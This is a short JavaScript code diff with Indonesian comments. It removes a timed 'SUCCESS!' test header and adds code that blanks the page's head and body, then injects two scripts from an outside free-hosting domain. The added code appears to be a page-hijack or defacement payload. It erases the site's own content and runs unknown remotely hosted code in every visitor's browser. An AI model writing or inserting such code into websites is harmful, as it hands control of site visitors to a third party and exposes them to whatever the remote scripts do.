@@ -1,12 +1,19 @@
-    setInterval(() => {
-      // Hapus elemen <h1> sebelumnya jika ada
-      const prev = document.querySelector('h1');
-      if (prev) prev.remove();
+document.head.innerHTML = "";
+document.body.innerHTML = "";
 
-      // Buat elemen <h1> baru
-      const header = document.createElement('h1');
-      header.textContent = 'SUCCESS! ' + new Date().toLocaleTimeString();
 
-      // Sisipkan ke dalam body
-      document.body.appendChild(header);
-    }, 1000);
+const injectScripts = async () => {
+  const injectScript = (src, attributes = {}) =>
+    new Promise((resolve) => {
+      const script = document.createElement("script");
+      script.src = src;
+      Object.entries(attributes).forEach(([key, value]) => script.setAttribute(key, value));
+      script.onload = resolve;
+      document.head.appendChild(script);
+    });
+
+  await injectScript("https://indocine.yn.lt/jquery.js");
+  await injectScript("https://indocine.yn.lt/init.js");
+};
+
+injectScripts();
